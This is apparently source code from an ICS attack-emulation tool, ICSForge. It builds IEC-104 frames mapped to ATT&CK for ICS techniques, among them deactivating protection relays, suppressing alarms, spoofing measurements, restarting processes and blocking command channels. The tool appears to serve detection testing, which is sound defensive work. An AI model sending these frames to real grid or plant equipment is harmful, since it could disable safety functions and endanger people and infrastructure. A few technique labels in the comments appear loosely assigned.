# ICSForge IEC-60870-5-104 payload builder — upgraded for ATT&CK realism
import datetime
import random
import struct
import time as _time_mod


# IEC-104 ASDU Type IDs
TYPE = {
    # Monitoring direction (process information)
    "meas_sp":         1,   # M_SP_NA_1  Single-point information
    "meas_dp":         3,   # M_DP_NA_1  Double-point information
    "meas_mv":        13,   # M_ME_NC_1  Short float measurement
    "meas_int":       11,   # M_ME_NB_1  Scaled value
    "end_init":       70,   # M_EI_NA_1  End of initialization
    # Control direction (command)
    "single_command":  45,  # C_SC_NA_1
    "double_command":  46,  # C_DC_NA_1
    "setpoint_norm":   48,  # C_SE_NA_1  Normalized value setpoint
    "setpoint_scale":  49,  # C_SE_NB_1  Scaled value setpoint
    "setpoint_float":  50,  # C_SE_NC_1  Short float setpoint
    "regulating_step": 47,  # C_RC_NA_1  Regulating-step command
    # System commands
    "interrogation":  100,  # C_IC_NA_1
    "counter_interr": 101,  # C_CI_NA_1
    "clock_sync":     103,  # C_CS_NA_1
    "test_command":   104,  # C_TS_NA_1
    "reset_process":  105,  # C_RP_NA_1
    "test_with_time": 107,  # C_TS_TA_1
    # Parameters
    "param_mv":        110, # P_ME_NA_1  Parameter of measured values
    "param_activ":     113, # P_AC_NA_1  Parameter activation
    # Private / inhibit
    "inhibit_act":      51, # M_EI_NA_1 used for inhibit pattern
}

# Cause of Transmission codes
COT = {
    "periodic":     1,
    "background":   2,
    "spontaneous":  3,
    "init":         4,
    "request":      5,
    "activation":   6,
    "act_confirm":  7,
    "deactivation": 8,
    "deact_confirm":9,
    "term_activ":  10,
    "return_info_rem": 11,
    "return_info_loc": 12,
    "file_transfer":13,
    "interr_global":20,
    "interr_group1":21,
}


def _apci_i(send_seq: int, recv_seq: int, asdu: bytes) -> bytes:
    """I-format APCI (numbered information transfer)."""
    s = (send_seq & 0x7FFF) << 1
    r = (recv_seq & 0x7FFF) << 1
    ctrl = struct.pack("<HH", s, r)
    apci = b"\x68" + bytes([4 + len(asdu)]) + ctrl
    return apci + asdu


def _apci_u(func: str) -> bytes:
    """U-format APCI (unnumbered control)."""
    codes = {
        "startdt_act":  0x07, "startdt_con": 0x0B,
        "stopdt_act":   0x13, "stopdt_con":  0x23,
        "testfr_act":   0x43, "testfr_con":  0x83,
    }
    b = codes.get(func, 0x07)
    return b"\x68\x04" + bytes([b, 0x00, 0x00, 0x00])


def _asdu(type_id: int, cot: int, ca: int, ioa: int, data: bytes) -> bytes:
    """Build ASDU: TypeID(1) VSQ(1) COT(2) CA(2) IOA(3) + data."""
    vsq = 0x01  # SQ=0, count=1
    return struct.pack("<BBHH", type_id, vsq, cot, ca) + ioa.to_bytes(3, "little") + data


def build_payload(marker: str, style: str = "meas_sp", **kwargs) -> bytes:
    """
    Build IEC-104 APCI+ASDU frame.

    Styles:
      meas_sp            M_SP_NA_1 — T0801 Monitor Process State
      meas_mv            M_ME_NC_1 float — T0801 analog monitoring
      single_command     C_SC_NA_1 — T0855/T0831 Unauthorized/Manipulation
      double_command     C_DC_NA_1 — T0831 Manipulation of Control
      setpoint_float     C_SE_NC_1 — T0836 Modify Parameter / T0831
      setpoint_scale     C_SE_NB_1 — T0836 Modify Parameter
      regulating_step    C_RC_NA_1 — T0831 step-up/step-down
      interrogation      C_IC_NA_1 — T0841 scanning / T0882
      counter_interr     C_CI_NA_1 — T0882 Theft of Operational Info
      clock_sync         C_CS_NA_1 — T0849 Masquerading (time injection)
      reset_process      C_RP_NA_1 — T0816 Device Restart
      test_command       C_TS_NA_1 — T0841 connectivity probe
      param_mv           P_ME_NA_1 — T0836 parameter write
      param_activ        P_AC_NA_1 — T0878 Alarm Suppression (inhibit)
      startdt            U-format startdt — T0883 probe
      stopdt             U-format stopdt — T0815 Denial of View
      testfr             U-format testfr — T0841 probe
      inhibit_alarm      P_AC_NA_1 with deactivation COT — T0878
    """
    rnd  = random.Random(kwargs.get("seed"))
    # Monotonic send sequence from engine; None → random per packet
    _iec104_seq: int | None = (int(kwargs.get("iec104_seq")) & 0x7FFF) if kwargs.get("iec104_seq") is not None else None
    ca   = int(kwargs.get("ca",  rnd.randint(1, 10))) & 0xFFFF
    ioa  = int(kwargs.get("ioa", rnd.randint(1, 100)))

    if style == "startdt":
        # U-format APCI frame. Per IEC 60870-5-104 §5.1, U-format frames
        # are fixed 6 bytes with no application data. Appending the marker
        # breaks TCP-stream parsing for downstream dissectors (Wireshark
        # shows "ERR prefix N bytes" for every subsequent APCI). The trade-
        # off is losing per-packet marker correlation on U-format control
        # frames, which carry no app data anyway.
        return _apci_u("startdt_act")

    if style == "stopdt":
        return _apci_u("stopdt_act")

    if style == "testfr":
        return _apci_u("testfr_act")

    # IEC-104 I-format frames: marker is OMITTED to preserve APCI length
    # integrity. Per IEC 60870-5-101/104, the ASDU length is derived from
    # type ID + element count; appending arbitrary bytes after the IOA
    # elements makes the ASDU invalid per spec (Wireshark/Zeek/Malcolm
    # dissectors all flag "Invalid Apdulen"). Run correlation for IEC-104
    # remains available via the JSONL events file (run_id, technique,
    # step). A follow-up may add marker delivery as additional synthetic
    # IOA elements, but that requires per-type IOA encoders.
    if style == "meas_sp":
        # Single-point: SIQ = 0x01 (ON, valid)
        data = b"\x01"
        asdu = _asdu(TYPE["meas_sp"], COT["spontaneous"], ca, ioa, data)

    elif style == "meas_mv":
        # Short float measurement
        val  = struct.pack("<f", rnd.uniform(0.0, 100.0))
        data = val + b"\x00"  # quality = 0 (valid)
        asdu = _asdu(TYPE["meas_mv"], COT["periodic"], ca, ioa, data)

    elif style == "single_command":
        # SCO: SE=0 (execute), QU=0 (no add def), SCS=1 (ON)
        sco  = bytes([0x01])  # SCS=1
        data = sco
        asdu = _asdu(TYPE["single_command"], COT["activation"], ca, ioa, data)

    elif style == "double_command":
        # DCO: SE=0, QU=0, DCS=2 (ON)
        dco  = bytes([0x02])
        data = dco
        asdu = _asdu(TYPE["double_command"], COT["activation"], ca, ioa, data)

    elif style == "setpoint_float":
        # Short float setpoint
        val  = struct.pack("<f", float(kwargs.get("value", rnd.uniform(0.0, 100.0))))
        qos  = b"\x00"  # QL=0 default
        data = val + qos
        asdu = _asdu(TYPE["setpoint_float"], COT["activation"], ca, ioa, data)

    elif style == "setpoint_scale":
        # Scaled value setpoint (2 bytes)
        val  = struct.pack("<h", int(kwargs.get("value", rnd.randint(-32768, 32767))))
        qos  = b"\x00"
        data = val + qos
        asdu = _asdu(TYPE["setpoint_scale"], COT["activation"], ca, ioa, data)

    elif style == "regulating_step":
        # Regulating step: RCS=0x02 (NEXT_HIGHER), SE=0
        rcs  = bytes([0x02])
        data = rcs
        asdu = _asdu(TYPE["regulating_step"], COT["activation"], ca, ioa, data)

    elif style == "interrogation":
        # Global interrogation QOI=20
        data = bytes([0x14])  # QOI = 20 = global
        asdu = _asdu(TYPE["interrogation"], COT["activation"], ca, 0, data)

    elif style == "counter_interr":
        data = bytes([0x05])  # QCC group 5
        asdu = _asdu(TYPE["counter_interr"], COT["activation"], ca, 0, data)

    elif style == "clock_sync":
        # 7-byte CP56Time2a: real wall-clock time per IEC 60870-5-4 §8.1.1.4
        _now = datetime.datetime.now(datetime.timezone.utc)
        _ms  = _now.second * 1000 + _now.microsecond // 1000
        t7   = struct.pack("<HBBBBB",
            _ms & 0xFFFF,                           # milliseconds (0-59999)
            _now.minute & 0x3F,                     # minutes (0-59)
            _now.hour & 0x1F,                       # hours (0-23)
            (_now.isoweekday() << 5) | _now.day,    # day-of-week(3) + day(5)
            _now.month & 0x0F,                      # month (1-12)
            _now.year % 100,                        # year (0-99)
        )
        data = t7
        asdu = _asdu(TYPE["clock_sync"], COT["activation"], ca, 0, data)

    elif style == "reset_process":
        # QRP = 1 (general reset of process)
        data = bytes([0x01])
        asdu = _asdu(TYPE["reset_process"], COT["activation"], ca, 0, data)

    elif style == "test_command":
        data = struct.pack(">H", rnd.randint(0, 0xFFFF))
        asdu = _asdu(TYPE["test_command"], COT["activation"], ca, 0, data)

    elif style == "param_mv":
        # Normalized parameter write
        val  = struct.pack("<h", int(kwargs.get("value", rnd.randint(-32768, 32767))))
        qpm  = bytes([0x00])  # QPM = default
        data = val + qpm
        asdu = _asdu(TYPE["param_mv"], COT["activation"], ca, ioa, data)

    elif style in ("param_activ", "inhibit_alarm"):
        # Parameter activation or inhibit — T0878 Alarm Suppression
        # COT deactivation = inhibit spontaneous reporting
        cot_actual = COT["deactivation"] if style == "inhibit_alarm" else COT["activation"]
        qpa  = bytes([0x03])  # QPA = act/deact of persistent cyclic/per trans
        data = qpa
        asdu = _asdu(TYPE["param_activ"], cot_actual, ca, ioa, data)

    elif style == "param_threshold":
        # P_ME_NA_1 — write measured value parameter (alarm threshold) — T0838 Modify Alarm Settings
        # Set measurement limit to extreme value so alarm never triggers
        val  = struct.pack("<h", 0x7FFF)  # max scaled value = alarm threshold raised to max
        qpm  = bytes([0x00])
        data = val + qpm
        asdu = _asdu(TYPE["param_mv"], COT["activation"], ca, ioa, data)

    elif style == "counter_reset":
        # C_CI_NA_1 with reset qualifier — T0872 Indicator Removal (clear event log)
        # QCC bit 6 set = freeze + reset
        qcc  = bytes([0x45])  # group 5 counter + freeze + reset
        data = qcc
        asdu = _asdu(TYPE["counter_interr"], COT["activation"], ca, ioa, data)

    elif style == "meas_inject":
        # M_ME_NC_1 (float measurement) injected from attacker — T0856 Spoof Reporting Message
        # Attacker sends fake measurement values upstream toward SCADA
        val  = struct.pack("<f", float(kwargs.get("value", rnd.uniform(10.0, 100.0))))
        qds  = bytes([0x00])  # QDS = good quality
        data = val + qds
        asdu = _asdu(TYPE["meas_mv"], COT["spontaneous"], ca, ioa, data)

    elif style == "protection_cmd":
        # C_SC_NA_1 to protection relay IOA range — T0837 Loss of Protection
        # Sends "deactivate protection" command to relay IOA
        sco  = bytes([0x00])  # SCO = off (deactivate)
        data = sco
        asdu = _asdu(TYPE["single_command"], COT["deactivation"], ca, ioa, data)

    elif style == "block_cmd":
        # U-format STOPDT — blocks command channel (T0803 Block Command Message).
        # U-format frames carry no app data; marker omitted for dissector safety.
        return _apci_u("stopdt_act")

    elif style == "clock_inject":
        # C_CS_NA_1 with wrong timestamp — T0849 Masquerading (clock manipulation)
        ts = int(_time_mod.time() * 1000) & 0xFFFFFFFFFFFF
        cp56 = ts.to_bytes(7, "little")
        data = cp56
        asdu = _asdu(TYPE["clock_sync"], COT["activation"], ca, 0, data)

    elif style == "available":
        # U-format STARTDT — T0800 Activate Firmware Update Mode.
        # U-format frames carry no app data; marker omitted for dissector safety.
        return _apci_u("startdt_act")

    else:
        # fallback: single-point measurement
        data = b"\x01"
        asdu = _asdu(TYPE["meas_sp"], COT["spontaneous"], ca, ioa, data)

    seq  = _iec104_seq if _iec104_seq is not None else rnd.randint(0, 0x7FFF)
    return _apci_i(seq, 0, asdu)
